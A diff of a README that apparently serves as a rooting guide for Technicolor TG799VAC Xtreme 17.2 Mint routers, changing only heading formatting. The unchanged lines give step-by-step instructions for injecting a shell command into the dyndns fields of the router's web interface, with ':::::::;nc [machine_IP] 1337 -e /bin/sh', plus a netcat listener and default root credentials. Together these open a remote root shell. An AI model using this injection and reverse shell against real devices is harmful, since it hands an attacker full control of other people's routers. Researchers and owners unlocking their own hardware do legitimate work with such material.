@@ -69,7 +69,7 @@ This means I can sue them in a court of law. Please read more here: https://www.
 echo "bank_2" > /proc/bankversion/active 
 ```
 
-# Boards
+## Boards
 
 ### Telia - Board: VANT-W
 
@@ -127,7 +127,7 @@ Download URLS:
 
 ## SSH
 
-## SHORT VERSION
+- SHORT VERSION
 
 ![Screenshot](files/short-version.gif)
 
@@ -136,29 +136,29 @@ Download URLS:
 * Default password: root
 * You now got shell access with full root access.
 
-##### Copy and paste all this stuff in dyndns field in webgui (edit ip):
+- Copy and paste all this stuff in dyndns field in webgui (edit ip):
 
 ```sh
 ::::::;nc 192.168.1.144 1337 -e /bin/sh
 ```
 
-## LONG VERSION:
+/ LONG VERSION:
 
 ![Screenshot](files/tg799vacv2.gif)
 
-#### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port:
+- Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port:
 
 ```sh
 nc -lvvp 1337
 ```
 
-#### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
+- Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand
 
 ```sh
 :::::::;nc [machine_IP] 1337 -e /bin/sh
 ```
 
-##### You will see something similiar and if you see this then you got root access, type ls / for example:
+- You will see something similiar and if you see this then you got root access, type ls / for example:
 
 ```sh
 listening on [any] 1337 ...
